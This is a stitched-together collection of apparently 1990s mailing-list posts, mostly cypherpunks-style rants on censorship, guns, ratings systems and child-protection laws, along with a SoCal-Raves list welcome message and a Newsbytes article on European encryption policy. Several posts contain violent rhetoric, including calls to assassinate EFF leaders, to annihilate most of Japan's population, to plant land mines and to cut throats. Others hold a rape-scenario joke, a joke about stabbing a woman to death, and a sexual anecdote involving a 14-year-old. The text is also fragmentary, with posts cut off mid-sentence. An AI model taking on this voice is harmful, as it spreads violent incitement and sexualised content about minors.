this court, at the courthouse of this court.
                (signed by the issuing magistrate)
                    (end of warrant excerpts)
The firearms in question, as I mentioned earlier, are actually
owned by a friend of Rex's & Robert's in the Sacramento area.
Robert told the Naz. . I mean, the Nice Officers who the individual
is and where he lives. How did the folks in the Sacramento
jurisdiction handle it with this third guy? Couple o' folks came to
his house, talked with him, looked at the weapons and determined
that they either are not the statutorily defined assault weapons
mentioned in the warrant (it IS hard to distinguish a lot of these
carbines from each other from a pho- tograph alone); or, if they
are the weapons described, they are none- theless legally possessed
by the owner. And they left, with no arrest of confiscations.
Rex, Robert, and their respective families should at this point (in
my humble lay opinion) have excellent cases against both Costco
(for slander and defamation; also for loss of future income in
Rex's case if the San Francisco Police Department now refuses to
hire him) and (at least) the Sonoma County Sheriff's department. An
important as- pect of self-defense (and of ninpo, for that matter)
is to have the right sorts of connections to get things done, and
I've contacted an attorney who is interested in looking into the
matter. For the record: Yes, I most certainly WILL "go to war",
metaphorically speaking, for my people.

@_subject: your LISTSERV request  "subscribe socal-raves-digest"Re: your LISTSERV request  "subscribe socal-raves-digest" 
Better known as SoCal-Raves, this list is for the discussion of
anything having to do with raves and the underground club/dance scene
in the Southern California area.  This includes the counties of Los
Angeles, Orange, San Diego, Riverside, San Bernardino, and possibly
Ventura and Santa Barbara as well.
     Don't let the broad area scare you.  This list is about the local
scene.  About what is happening near you.  Although rave flyers seem
to think L.A. and San Diego are the only places local DJs are from,
there is quite possibly something going on in your backyard.  And this
is the place to talk about it.
     Appropriate topics include:
       - announcements of upcoming events in the Southern California        - reviews of shows/raves/DJs/music/etc.
       - rave-culture like clothes, smart drinks, rave attitude, etc.
       - local radio shows and stations that play rave and techno.
       - where to find the music, clothes, etc.
       - rave picnics and other non-rave rave-related events.
       - how to throw your own rave (and not get busted).
       ...and almost anything else rave related or related to the
          local scene.
     Try not to discuss raves not in the Southern California area or
subjects that don't have anything to do with raves or this area.
Though some discussions of other rave scenes may at times be
appropriate.  And try to keep from getting into flame wars and overly
personal discussions on the list.  Some comments are probably better
kept to personal mail.  Keep in mind that what you are sending to the
list you are sending to everybody.
      Other than that, go for it.  This is your list.  Your scene.
I'm hoping that this list can be a catalyst for helping to improve and
unify the scene in SoCal.  At least we should be able to get that
"community" feeling that so many have trouble finding in the SoCal
rave scene.  And maybe, some day soon, we might even be throwing our
own raves just as the SFRaves list has.
      This list should also be a good place to find out about the
scene in SoCal.  Hopefully soon there will be a calendar list.  In the
mean time please send me any info you have on upcoming raves and I
will compile an upcoming rave calendar and post it to the list once a
      Now for the technical stuff:
      - Any mail sent to socal-raves at ucsd.edu will get sent out to
        everyone who subscribes to the list.
      - socal-raves-request at ucsd.edu should be used to subscribe and
        unsubscribe to the list.  To subscribe you should send a
        message with the line "sub socal-raves" or         "sub  socal-raves" in the body of the message,
        not the subject line.  The latter form should be used if you
        want to use an address other than the one shown in the "From:"
        line of the message.  If at any time you want to unsubscribe
        or delete your name from the list (we would miss you) the line
        would be "del socal-raves".  If you need help send a message
        with the line "HELP" and you will get a help file on how to
        use the listserv.
      - Administrative problems about the list should be sent to
        socal-raves-relay at ucsd.edu and Vigor Mortis, list administrator
        extraordinaire, will take care of you.
      - Any other SoCal-Raves list questions and rave info (for the
        calendar) should go to me at underdog at netcom.com
      Some info about me.  When I started college about a five years
ago I was intrigued by industrial music that was nameless to me at the
time.  Within a year or two I was doing an industrial radio show and
going to underground clubs that played everything from acid house to
industrial danse.  Although many of these clubs were illegal, there
was not a lot of hype, and they were definitely better than the L.A.
club scene (which always seemed to me to be one big pickup joint/ meat
market).  They were basic.  Raw.  Even tribal.  Full of energy.  They
gave me a place to dance without feeling pressured to ask some woman
to dance with me who could care less.  I really wanted to start a
"gypsy club" of my own in Orange County.  Not for profit, just so that
people might have a local place to go.  But too many things and people
conspired against me.
     Then the word "rave" came into existence and shortly following
808 State's new album.  It seemed to me that all the energy of
Industrial, and the groove of Acid House was forming a new "Techno"
genre and a new scene.  This was a fresh injection of energy.  The
underground parties grew up.  There was new hype and new ideas.  More
of my friends came with me to rave.  And the birth of a new radio
station helped expand the scene.
      It was fun and still is.  But the radio station died.  The scene
mostly caved in on it's own weight (hype and greed only go so far).
Big raves that I paid good money for didn't happen.  And we are left
with what?
      There is still that sense of acceptance.  The sense of unity and
anything goes.  And I think we are starting to come back to that old
feeling of community and being a part of something again.  This summer
a few friends and I were even able to throw a few free outdoor raves.
Though small, these were to be the start of a regular thing for the
summer but the fourth one got busted and we stopped.  I'm hoping that
it will happen again though (legally :).
      The underground scene here always seems to be able to recreate
      Remember,the rave scene is for and about the people.  About
individual empowerment.  Where an artist in a bedroom can get as big
as the world will allow and where 'people' not 'person' are the center
of attention.
      Big thanks go out to Brian (Vitamin B) and the SFRaves mailing
list for inspiration, Dana Watanabe my co-conspirator in raves and
other things, and Andy Ferrell (Vigor Mortis) for administrating and
offering a place for the SoCal-Raves list.
      I hope you enjoy this list as much as I do.
      Peace and Love.  And may you find a rave wherever you are.

After failing to find in the list archives previous posts from the

about the cypherpunks that was sent to the list some months ago.
Although I seem to recall this post as being authentic I am unable to
confirm this since my browser doesn't seem to be getting along with the
search engines for some reason or another. Can anyone confirm that the

have found and corelated messages from the same server which indicate
that if the message came to the list with the message ID below then it
was indeed composed and initially sent the day before the article quoted
actually appeared in the newspaper.
If someone could confirm that the following message appeared on the list
with the same header as indicated below I would appreciate it.

  Japanese society has long been very rule-oriented, in large part as
a result of the country's geography, population and history.
  A "No Farting" sign which might reek of totalitarianism when placed
on the open range, might well seem less so when placed in a two-man
tent occupied by six people. Environment, geography and the history
of a a country, society and its people, all play a part in the degree
to which an individual will view their personal position in regard to
the society and government around them. And each will perceive the way
in which they feel they can best promote their beliefs within their
society and government.
  It seemed to me that after Jim Bell's arrest, most of the posts to
the list posted an almost-standard disclaimer: "Actually, although
I hardly knew the man, thought he was a _loon_, and _disagreed_ with
most of what he had to say..."
  Government aside, if I was forced by fate to live in Japan, my first
act would probably be to annihilate 80% of the population, just to get
enough elbow room to negate the need for so damn many rules, both from
society and government. Of course, the same could probably be said for
New York City, from my persepective.
  I hope that the "flag" Tim is wrapping himself in isn't the same one
that he was burning yesterday.
  {Not that I'm accusing Tim of being purposely deceitful. It's just
that when we throw a "leaner" instead of a "ringer," they sometimes
lean in opposite directions.}
  Seriously, I believe in the original goals of organizations such as
the EFF and CDT, etc, but I also believe that their leaders should be
assassinated every few years in order to allow the promotion of people
whose senses are not so hardened by D.C. that they no longer recognize
a "stench" when they smell it. (ibid, the Constitution and our beloved
  Joichi Ito sounds very sincere about his commitment to act in a way
he feels will promote cypherpunkish viewpoints within his system of
government. I can't help but believe, however, that his efforts will
ultimately only serve to delay the creeping spread of tyrannical cancer
in our societies and our governments.
  I tend to lean more toward Tim's viewpoint, that there comes a point
when the best option is surgery (a radical Legislat-ectomy?), but I
would not go so far as to suggest that others should not pursue other
treatments which they think may stem the tide of the disease.
  I hope Joichi Ito paid enough attention to the OKC bombing to realize
that some surgeons are less skilled than others, and that there is a
risk in remaining too long in close proximity with cancerous tissue.

This may explain why my paramilitarist neighbor's garden always does
so much better than mine. (It could also explain the bone fragments in
his garden potatoes.)
  Definition of a CypherPunk tragedy: "A Killfile being deleted without
an ASCII Art message in it."   The JSDF, Chobetsu, etc., might well say the same thing about his
co-opting by the CypherPunks.
  I believe that you are right about scrutinizing and criticizing the
work of all politicians and reporters, but I doubt any of us could
ultimately reach agreement on what exactly constitutes being co-opted,
or exactly when one of "us" becomes one of "them."
  I value Declan McCullagh's reporting on privacy and crypto issues,
but I recognize the need to ask him to "take his shirt off" every now
and again so we can check to see if he has an alien creature stuck
to his back, controlling his mind.
  The problem with sending spies and secret agents into the enemy
camps has always been that they may grow to like the enemy's life-
style a little *too* much.
  Don't shoot, I was just being fascetious.
  To tell the truth, I find it confusing these days to figure out
flag is being burned, or used to wrap oneself in, these days. Is it the
flag that defends freedom or the flag that defends children? Is it the
flag that defends the Constitution or the flag that defends "national
security?" {And if it is the flag that defends the Constitution, then
*which* Constitution? The one the founders wrote, or the one being used
as a doormat at the Whitehouse?)
  Or, perhaps, "If you dislike government why don't you just refuse to participate in it?"
  Different strokes for different folks. Sometimes the pen is indeed
mightier than the sword (or a Ryder truck) and sometimes the almighty
dollar is mightier than either. Regardless, "We have met the enemy, and
he is us." probably comes closer to the heart of the problem with our
societies and governments than any socio-political analysis of the issues and events of our time.
  The problem is not who writes what, and the reasons behind it, the
problem is the aspect of our human nature which wants us to believe
in Santa Claus, benevolent government and the goodness of our fellow
man, despite evidence to the contrary. The problem is not who blows
up a building, or a city, the problem is the aspect of our human nature which wants us to paint the face of justice or terrorism on
the action instead of recognizing the injustice, regardless of the
necessity, or lack thereof, of the action.
  The bottom line is that, despite our personal beliefs as to "the
meaning of life" and the values and beliefs it should be lived by,
it may well be that this planet's true purpose is to serve as a
compost pile to provide nourishment for more intelligent forms of
life being grown/evolved elsewhere.

Can you say "Wall Street?"  Because that's exactly how it operates right now.  The money being thrown at the stock market today is not "investing," it's simply a pyramid scheme.
This is what happened when the US Savings & Loans Banks in the Southwest failed in the 80's.  All of the people who lost money were bailed out by the FDIC, which of course is funded by taxpayer money.  The final figure was approximately $500 billion, depending on whose estimates you believe.  So the idiots who didn't do their homework and put money into a bogus S&L were bailed out by everyone else who was smart enough to know better.  And, of course, the fraudsters (one of whom was the son of then Vice-President George Bush) got away with a slap on the wrist.
Go figure.

[Not-News NetWork-- Mohave Desert] Aug 4/97
 WHAT DOES A FIVE HUNDRED POUND GORILLA READ AT THE BREAKFAST TABLE?
 -------------------------------------------------------------------
                                                               - sog
The "Not-News Gorilla NutWork" was rocket-launched in the Mohave Desert
early yesterday morning  by a rag-tag bunch of paramilitarist computer gurus who unveiled an InterNet Bill of Bytes that included the words, "MicroSoft shall make no laws..."
Angered by a self-appointed council of computer industry magnates who
have announced their intention to seize fascist control of the quickly
burdgeoning Information Highway by controlling the definition of all
information, the rebels set up a shooting range which contained a wide
variety of targets ranging from copies of the Wall Street Journal to
life-sized cardboard cut-outs of a hooded figure referred to only as,
"a billionaire to be named later."
A Che Guerva look-alike named Lefty (a nickname changed from "Lucky"
after a laboratory accident took three of the fingers on his right
hand) spoke openly about the group's loose-knit plans to impose their
own ratings system on corporations who have "taken it upon themselves
to decide what is news and what is not--what is information and what
is obscenity."   "We have decided on two classes of ratings." explained a tassle-
haired young woman as she slid shells into a Winchester Defender
sitting on her lap. "On..." she said, lifting the shotgun with one
hand, then liberating the hooded head from a nearby cardboard cut-out,
before turning back to say, with a Cheshire grin, "...and _off_."
The wide array of luxury automobiles and high-end computer gear on
display at the gathering lent credence to the claim of a quiet older
man whose only comment during my presence was, "The people here
probably have a combined access to more soft targets than the NSA."
He turned to punctuate his statement, as many others did that day,
with a volley of fire that penetrated targets carrying the corporate
logos of a variety of big-name players in the computer industry.
Surprisingly, the conversation consisted almost totally of issues
surrounding privacy, self-determination and freedom from censorship,
with hardly a word being spoken about potential plans of action of
individuals or the group. As the quiet man's equally quiet wife
spoke in what seemed to be a deathly whisper, telling me, "Everyone
here knows what they have to do.", a man with a crude, homemade
rocket-launcher sent a flaming projectile into the side of a small
propane tank several hundred feet away, as if punctuating the last
and most meaningful statement of the day.
  After quietly dispersing a few minutes later, the group packed up
their weapons and climbed into their vehicles without a word between
them, each seemingly going their own separate ways.
  I stayed on after the last of the others had left, reflecting on the
fact that I had arrived at this gathering by virtue of a late-night
phone call to my unlisted number, and found that I knew none of the
participants in the activities.
  I had the strangest feeling that the others there had arrived by the
same anonymous process as I had, and I wondered if they were equally
mystified as to who had arranged this impromptu assembly of apparent
strangers joined in a common cause. Immediately, one of the pickup
trucks driving away backfired, and I thought of synchronicity, knowing
that the truck would backfire once again, which it immediately did, before disappearing quietly out of sight.
  Climbing into my own vehicle, I took a last look at the site, which
had been cleaned and left exactly the way it was when I had first
arrived on the scene. I experienced a moment of deja-vue, as if I had
just arrived and none of what I had experienced that day had truly
  Somewhere in the distance, a vehicle backfired...
Disclaimer - I am not a reporter, I am not a paramilitarist, and I am
not a computer expert. I have no idea what I was doing there and I am
not even certain that I should be speaking about the event...but I am.

EC Ministers Draw Up European Online Policy      August 5, 1997
     Newsbytes : by Steve Gold.      Following on from a conference held in Germany last
     month, representatives from 39 European countries have
     signed a declaration calling for the free flow of information.      The event, held between July 6-8 in Bonn, was called "Global
     Information Networks: Realizing the Potential," and was
     attended by 39 European ministers, as well as European
     Commission (EC) representatives from Japan, Russia, the US
     and Canada.      At the event, ministers focused on two main issues:
     encryption, and the censorship of illegal material such as child
     pornography on the Internet.      The declaration notes that there are a number of important
     differences between US and Europe on encryption and
     information privacy.      According to MacRoberts, the Edinburgh, Scotland-based
     information technology (IT) law firm, the declaration may not
     go down too well in US circles, since it is conceivable that
     the EC may block US-based businesses from conducting
     electronic commerce on the Internet.      According to officials with MacRoberts, this could result in
     European becoming isolated, rather than the EC teaching the
     US a lesson.      According to MacRoberts, the Bonn declaration calls for the
     free flow of information, whilst protecting the privacy of
     data, and a clear division of legal responsibility between the
     creators of Internet content and access providers, network
     operators and other intermediaries.      In addition, the declaration calls for the recognition of the
     necessity of strong encryption technology, to facilitate
     electronic commerce subject to "applicable law," and the
     introduction of consumer protection through self- regulation.      According to Joanna Noag-Thomson, an associate in
     MacRobert's Intellectual Property and Technology Law
     Group, the declaration deals with many of the issues in
     President Clinton's "Framework for Global Electronic
     Commerce" and, while the US and Europe appear to agree on
     many fundamental issues, important policy differences
     continue to exist, particularly in the areas of information
     privacy and encryption.      "The European stance on encryption is to be commended --
     the European Ministers' view is more commercially
     acceptable in that it recognizes that electronic commerce
     requires strong encryption technology," she said.      "At the same time, it recognizes that measures to restrict
     encryption should be proportionate At present, the US and
     Europe appear to have different views on what constitutes
     `proportionate' restrictions," she added.      According to Boag-Thomson, the EC has warned that, unless
     the US provides adequate protection of personal information,
     it may block any US-based entity from conducting electronic
     commerce on the Internet.      "The EU Data Protection Directive forbids data flow to
     countries outside the EU which do not offer adequate
     protection of personal information. Although data protection
     is extremely important, I hope that we in Europe will not find
     ourselves isolated from the rest of the world and that a
     solution to this problem can be found," she said.      (19970804/Press Contact: Joanna Boag-Thomson

There's a similar debate about whether "guns kill people" or "people
kill people"[*].  Although it's the repressive regime that actually
causes the supression, the widespread availability of rating systems
makes it easier for them to do so.
Although the PICS rating system permits diverse rating systems, in
practice the oligopoly in the browser market confines this to the
value system of the ruling elite (unquote).  Notably, the current
RSACi rating system makes no distinction between consenting sex in
marriage and paedophilia: both earn a Sex-4 rating.  Probably many
people feel the first is more acceptable than the second, but they
have no way to express this in current PICS implementations.

Have you ever noticed that there
  Great place to meet "babes," huh Kent?
  I certainly do. I would locate books in a way such that the children would be exposed to a variety of materials, instead of herded into playpens according to age and size.
  Also, in areas where children are allowed in bars if they serve food,
or until a certain time of night, the atmosphere tends to be raised above just being a place for the parents to drink and get drunk.
  A 14 year-old guitar player named Little Charlie used to play with me
at the Austex Lounge in Austin, and the liquor laws required him to leave the bar when the band was not onstage. He spent the breaks out
in the parking lot, smoking dope and screwing his brains out with the
young groupies. (My liver is gone, and his dick fell off. Thanks to
the law, I won.)
  I think that a library-type cataloguing system adapted to the unique
form of the InterNet and WWW could be the greatest thing since sliced
bread. I would love not to have to visit 400 sites to find "hardware"
plumbing instead of "women's" plumbing (and vice-versa). Likewise, I
would rather not waste the bandwidth of myself and others when they
visit my site in error, thinking "arson" has to with fires, and not
with sex.
  The problem is that the words "voluntary" and "requirement" have,
through some weird mutation of DoubleSpeak, become synonyms.
  Hardly anybody even tries to pretend, anymore, that they are not planning to trample the constitution and fry anyone that gets in their
way when the ElectroMagnetic Curtain clangs shut.
  Even the Nazi's, in the early days, made some pretense of humanity
when shipping fellow humans to the death camps. "Jaccuzzi? No, I don't
thinks so, sir, but I'm certain there are plans for one. Now, climb
aboard, please." Eventually, the reign of terror reached the point where
it was all clubs and guns, with no need for pretense of humanity.
  When the gun-thievery began in earnest, the thieves still had to lie
in bigger and bigger stages, tearing small, then larger, pieces off the
Constitution at each step of their con game.
  With privacy and freedom, however, we have now reached a stage where
the pretense of democracy is perfunctory, with the fascists who are
rattling the chains standing on the stage behind the speaker as he or she assures us that "imprisonment for life will be a _voluntary_   The person I really feel bad for is Tim May. He used to at least be
able to tell people, "I told you so! Check the archives from my previous life, and..."
  Prophecy loses its luster once _everybody_ can predict the future, and things have reached the point where everyone recognizes their
cues in the march toward the "Tear-Stained Monologue" where, in an
allegorical way, "The good-guy gets the girl. _I_ wind up dead."
  Face it, we all know where the cattle-cars are going, but they are
carrying _other_ people--for now. Child molesters, drug dealers, and
similar robbing, raping, low-down vermin who shouldn't have any rights,
  Oh, and a lady who put a quarter in a stranger's parking meter. And
a 16 year old kid who shared a joint with a 15 3/4 year old friend. And
a guy who pulled a stink-bomb prank on a government office.
  Oh yes, and an employee at Livermore Labs who pledged allegiance to
the flag every day of his life, escrowed his crypto keys with the government even before it was required by law to do so, but forgot about
the PGP 2.1 key on the floppy he's been using to shim up the short-leg
of the couch on the front porch for the last few years.
  What are the major players in the computer and media industries planning in their secret meetings about the best way to require you
and I to "volunteer?"
  They are planning to collectively "take one step back," leaving us
("voluntarily") standing in the line of fire.
  When the call to assembly comes, I plan on being the first one to
line up. I think I'll position the line "one step ahead" of the land
mines I plant the night before.

pay the "voluntary" fine, a man with a gun comes with a summons requiring me to answer to the charge in the presence of the King.
{Not Elvis}
  I walked down to the city office with my dog, who came in and ran
around sniffing the Mountie and city employees as I paid their fine
for not cruelly imprisoning her. I asked how much I owed them for not beating her, too, but they just looked at me funny until I left.
  And this is a small country town, with "voluntary" stop signs.
  I think I'll get a knife or gun, climb through a bedroom window,
and find someone who wants to "voluntarily" have sex with me.
  "Ma'am, the reason I climbed through your window in the middle
of the night was to protect your children from inadvertantly
walking in and viewing the obscenity that's about to take place.
  "As a matter of fact, I think there is pending legislation to
_require_ you to have sex with me when I crawl through your
bedroom window in the middle of the night. It's for your own
protection, so that I don't have to bring a weapon, next time."

@_subject: forged cancels (Re: Entrust Technologies's Solo - free 
I wonder if there is a problem of inconsistent levels in this debate...
At one level, many people on this list are in favour of infrastructure
such as Usenet and the Web carrying all information without filtering with
respect to content, to avoid censorship, oppression and so on.
At another level, almost everybody has personal preferences as to what
they consider worthwhile information, what they want to read, what they
want their children/employees to read, and what they want their
privately-owned hardware to be used to carry.
At the content-free level, cancels are information just like anything
else, merely a stream of octets.  By definition, they _can't_ be morally
wrong at that amoral level where we talk only about whether
store-and-forward works properly or not.  Cancels, "forged" or otherwise
are just a tool, just bytes.
Within a particular value system, you might agree or disagree with a
particular cancel, or with the idea in general.  It's easy to configure a
news server or reader to conform to your preferences, just people who hate
spam are free to ignore it.  At this level, you can make judgements as to
which uses of that tool are justifiable.  (Cancels by sysadmins,
anti-spammers, spammers, system owners, governments, parents, copyright
lawyers or nobody at all.)

  If she says "I want nine inches, and I want to bleed." and you give
 her two inches, four times and stab her to death, using a 6" knife,
 then 4(DICK) + 6" = 8" + 6" = Nine Inch Nails.
   Therefore, Nine Inch Nails band members have 14" Dicks.
 Basing the Private Key on Nine Inch Nails private parts, and the
 Secret Key on the secret location where the dead woman's body is
 buried, the sick, twisted creators of the "Dick TruthMeasure  Encryption Algorithm" have produced a cryptography product which  cannot be broken by normal people, using normal math.
 This has been confirmed by the independent research of Carol Anne
 Cypherpunk, who reports that Kent Crispin has always claimed that
 this, ================>, is eight inches, while Tim C. May claims
 this, ================>, is fourteen inches.
 Her research methods have been approved by TruthMonger, who
 states, "Give her two inches, and she takes a mile. She never  judges an encryption algorithm until she's fucked a mile with  your Dick in a 'rubber boot'."
 In response, Carol Anne Cypherpunk said of TruthMongers sexual
 prowess, "He claims that his Dick was the inspiration for the

OK. Now that we've got that settled, what shall we talk about
next, Abortion or Ebonics?
  On its face, this is not an unreasonable concept.
  As I see it, the reason for the 'Fuck Compromise' stance being
so heartily proclaimed on the list is not because CypherPunks see
compromise as inherently evil, but because of the recognition that
compromise that is beneficial to both parties requires honesty
and integrity on the part of both parties.
  Compromise at the point of a gun is weakness, not wisdom, and
every step one loses is twice as hard to regain in the future.
The classic example is Hitler, who "only wanted Austria." Then he
"only wanted Poland."
  The government claimed they only wanted to ban the *bad* guns,
but as Tim May pointed out, now it is theoretically illegal in
some places for a citizen to carry a paring knife home from the
store. Of course, in practice, these laws will only be used against *bad* people. Mary Tyler Moore has nothing to worry about.
  The fallacy that creates more problems than it solves is that
there *is* a "right" way to do things.
  Life is a crapshoot, and the most we can hope for is to use our
best judgement to minimize whatever ill effects might occur as the result of haphazard circumstance.
  Sadly, our society has been moving further and further toward
a fascist, control-freak mentality which dictates that there are
clear lines between right and wrong actions, attitudes and beliefs.
Even more sadly, society is crying out for stiff punishment in
every niggardly aspect of life, including the areas which are
beyond the control of those involved.
  An example is the woman in New York (?) who went to get food for
her baby, and the dog killed/ate the baby while she was gone. The
masses called for her head on a platter and she was charged with
manslaughter (or whatever).
  I am certain that those who could afford a nanny to take care of
their children had enough time on their hands to write a letter to
the editor to call for the woman's imprisonment. I would not be
surprised to find that some of those letters to the editor were
of the opinion that, if the mother had no bread for the baby,
then she should have let the baby "eat cake."
  I couldn't help but think of this poor woman who had lost the
child that she was trying to feed and nurture. Did she need to
be 'punished' because her options were limited by her position
in life? I don't know all the details of her situation, but I
do know that neither the media nor the masses seemed to care
about the details--they just wanted blood.
  I would wager that there are far more children who die in the
company of their mother in a bad neighborhood, than those who
are eaten by the family dog. I would also wager that if the
Clinton's cat killed and ate Chelsea, that there would be no
charges pending.
  Which is the "right" choice--to take your child with you and
have him/her die when you are mugged--to leave your child at
home and have the dog eat him/her?
  Which is the "right" choice--to allow your child to learn about
kinky sex techniques and then die when they try hanging themself
from the ceiling and standing on a chair--to "protect" them from
exposure to *trash* such as this, and then they die by suffocation when their sex-partner tells them semi-strangulation enhances
sex, because they've never encountered information about it which
also mentions that it may be dangerous?
  If you beat your child in order to prevent them from doing what
you feel will be harmful to them, then society will put you in jail.
If you beat them psychologically, with guilt, and they kill themself
out of shame when they do something *bad*, society will give you
  Which is the "right" way to teach your children to avoid things
which will harm them? There *isn't* a "right" way.
  Before your child can understand speech, you can't protect them from touching a hot stove by "telling" them not to. Is it "wrong"
to slap their hand when they reach for it? Once they *do* know
how to understand what you are telling them, slapping their hand
may not be the best way to keep them from harm.
  The bottom line is that you have to use your best judgment about
issues such as these, and you will never be "right." You will merely
be doing the best that you can. If you don't care about making the
effort to protect your children and they never touch a hot stove,
it does not make you a "good" parent. If you care immensely, and
do everything you are capable of to protect your children and they
*do* touch a hot stove, it does not make you a "bad" parent.
  It is human nature that if you take your child to the park to
enrich their life, and they get killed by a meteor falling from
the sky, you may find yourself "blaming" yourself, saying, "If
only I hadn't taken him/her to the park!"
  This is part of life, and part of being human. However, when
others decide that you should be imprisoned for child endangerment
for taking your child outside when a single astronomer in China told the media that a meteorite "might" be on the way, then there
is something seriously wrong with society.
  Is this a ridiculous example? Sure it is...just like someone
claiming that they were justified in raping someone because
their slip was showing, so they were "asking for it."
  The point I am trying to make is that there are no ridiculous
examples. Moose Jaw, Saskatchewan, once had a law that required
pedestrians to walk on the right side of the sidewalk. This was
a fairly recent event.
  Insane? Yes, and City Council eventually figured out that they
were idiots, but if someone's child had died when bumping into
someone while their parent was walking them on the "wrong side"
of the sidewalk, the parent would have been legally guilty of child endangerment.
  The "Big Lie" that we tell ourselves is that we can guarantee
our safety and security, and that of our children, if we just
pass enough laws against things that are "wrong." If we can just
figure out who is "to blame" for society's ills and imprison   The guy who sold you the "junk bonds" might well have cost
you less money than the long-term government bonds you bought
just before inflation went through the roof. Who is the "right"
person to put in jail, and who is the "wrong" person to put in
jail? Truthfully, the "right" person to put in jail may well
be *you*. It might "protect" you from making bad financial
  I don't want your child to get molested by a pedophile. I don't
want your child to die of a heroin overdose. But I don't want a
video camera mounted in my home to monitor my activities in an
attempt to keep your child from coming to harm, either.
  A solution to protecting the citizens is to put them in prison
and keep the criminals on the outside. Really! We would be
protected by the security of concrete walls and locked doors.
  Is the "right" thing to do to put your child in prison?
I think you know better than that.
  Some children are going to be molested, some are going to be
abused and/or murdered, some are going to walk willingly, and
perhaps ignorantly, into bad situations that will lead them to
suffer irrepairable harm.
  I don't want this for your child, or for any child, but I
truly don't believe that they can be protected by making the
lives of everyone so regulated and restricted that our life
energy is drained from us by effectively imprisoning our
  When I was a child, there was a local priest named Father
Flanigan who enjoyed the company of young boys. He regularly
offered to take them to out-of-town hockey games, supervise
them in their parent's absence, etc.
  When he offered to take myself and several other young boys
to an out-of-town game, my parents allowed me to go with him,
but they also made a point of telling me not to let him put
his hand down my pants.
  The fact of the matter is, the trip enriched my life, and
Father Flanigan did many good things for the youth of my
community. Did he "molest" any of them? I don't know. He
didn't molest me, or anyone I know of.
  Were my parents "bad" parents? No, they were *great* parents.
They "protected" me by making their best judgement and giving
me the information they felt I needed in order to use my own
judgment effectively.
  Did my parents "endanger" me by allowing me to go with Father
Flanigan? Sure, they did. They also endangered me by allowing
me to go outside and risk getting hit by a falling meteor.
  Was Father Flanigan a pedophile? I don't know. Was he a pedophile, but non-active? I don't know. Did my parents know?
Perhaps, perhaps not. I wouldn't doubt that they may have asked
him about his fondness for young boys, or talked to those in a
position to know, or perhaps they merely used their own best
  Or, it could be that they and I are way off base, merely being
prejudiced by anti-Catholic views promoted by those with an axe
to grind against differing religious views.
  Regardless, when I was thirteen, I was approached by a guy
who stepped out of an alley and offered me $20.00 to let him
give me a blow-job. I politely declined, and went on my way.
  I spent about an hour at home with my family, without giving
the event much thought. However, at some point it occurred to
me that there were children younger than myself who might be
more vulnerable to the man's approach, and that, while he had
not used any force or pressure in the situation, that it was
possible that this could occur with a smaller child.
  I asked my mother if there was a law against adults offering
children money to let the adult give them a blow-job. She was
startled by my question, though she hid it as best she could,
but she was also amused that I was so casual about asking it.
  She dealt with the situation matter-of-factly, and I went
with a policeman to help him find the man. The policeman
chased him down, subdued him, and took him to jail.
  To tell the truth, I felt compassion for the man, since I
sensed that he was a tortured individual, and he had not really
done anything that 'violated' me, or 'infringed' on my right
to self-determination (although I would not have been able to
verbalize these feelings at the time).
  Looking back on the event, I realize that, strictly speaking,
I did not take a course of action that would lead to his being
judged and punished for what he did, but rather, for what he
"might" do.
  Was I "right" or "wrong" in subjecting someone who did not
do any harm to me to arrest and imprisonment? I don't know.
  It could very well be the man never had, and never would,
force himself on a child, or exert undue pressure on a child
in order to coerce the child into doing something against their
will. Can my actions be deemed "right" or "wrong," depending on
the "odds" of him forcing himself on a child, versus being of
strong enough character not to do evil to satisfy his desires?
  In retrospect, I believe I made my decision to act based on
the fact that I sensed that the man was not totally in control
of basing his actions only on his best rational judgement. It
could be that I had him wrongly imprisoned, or it could be that
I saved him from doing something he would regret for the rest
of his life.
  The irony of this story is that the local police solved their
"problem" with this man by buying him a bus ticket to a small
town nearby. End of problem...
  It is my belief that this "solution" to the local police's
"problem" is illustrative of the attempts of censors and
regulators to "shift" the problems instead of "solving" them.
  I could be dead in a ditch because my parents allowed me to
go with a priest who had a fondness for children. I could also
be dead in a ditch because my parents "protected" me from being
exposed to recognizing the reality of adults who are fond of
children, and I might not have had enough information to deal
properly with the guy who stepped out of the alley.
  Which legislation do we pass to protect our children? Do we
pass legislation "preventing" parents from allowing their
children to accompany an adult who is fond of children, or
do we pass legislation "requiring" parents to allow their
children to accompany an adult who is fond of children, but
who will enrich their lives and help them to understand the
difference between controlling one's urges versus violating
others in order to satisfy themself?
  The reality of the current state of affairs is that there
are a plethora of laws which prevent parents from making their
own decisions as to how to live their lives and how to raise
their children to the best of their ability.
  If you know that you need to slap your child's hand in order
to keep them from touching a hot stove, will you do so? What
if you also know that Child Services will take away your child
and put them in an orphanage if you do so?
  Is your child better off having a deformed hand and living
at home in a loving environment, or having a normal hand and
being raised by strangers who don't care for him/her?
  Laws aren't going to universally protect our children, nor are
rating systems, or lynchings. Nor, sadly, the best judgement of
concerned, loving parents.
  We can't solve the problems of life by passing legislation that
attempts to control everyone and everything, forcing us all to
meet standards that may be based on erronious beliefs and/or
  There are laws against murder. People still get murdered.
Punishment may be justified for the act of murder, but it
is not the "solution" to preventing murder. We can't legislate
away poverty, destitution, and desperation. Making "anger"
illegal won't prevent it. Making "embarassment" illegal won't
stop people from blushing.
  We are increasingly shifting "social" problems into the arena
of "legal" remedy. We "liberate" the mentally ill from their
confinement in nuthouses, and then we "imprison" them for
peeing in an alley because they live on the streets. We pass
laws limiting political campaign contributions, and then we
vote for the person who spends $50,000,000 on ads telling us
what an asshole their opponent is. We allow doctors to give
their patients heroin in order to relieve their suffering,
and we deny an Ambassadorship to someone who believes that
a doctor should be able to give his patients marijuana to
relieve their suffering.
  Yes, I care about other people, and I care about children.
I am not selfishly clinging to my rights to privacy and freedom
in order to further my own interests at the expense of others.
I am doing so because I don't believe that the world will be
a better place if my rights and freedoms are taken away.

Bullshit.  Most Christians I see IRL and on TV cringe at books other than The Good Book(TM).  Creationism is bullshit, God didn't make everything in 7 days, we evolved from monkeys and various others (Although many half-evolved monkeys can be seen on TV Evangelism shows and in Congress).
In order to believe in something, I need some hard facts.  I need to actually see a god (while I'm sober) talk to me and I talk back and see him actually makes things.  Unlike some of the weaker people, I can't just believe it because "anything's possible".  I can't believe it because a minister or a book tells me.  When I was around 8 years, I read this section of the bible asking questions like (it was in the back) "How do we know the bible is true?"  I was intersted, reading further, I noticed some page numbers, so I went there, finding not words of a scientist, but supposed words of god.  If god supposedly asked people to write this, and he says it's true, then that's called bullshit, because that's like someone writing a crypto algorithm, and stating it's secure even though no one else has seen it.

When your "activism" is backed with guns, it's called tyranny.

hands out of the public till.
  The "Right to Free Speech" means that we can cut their fucking throats
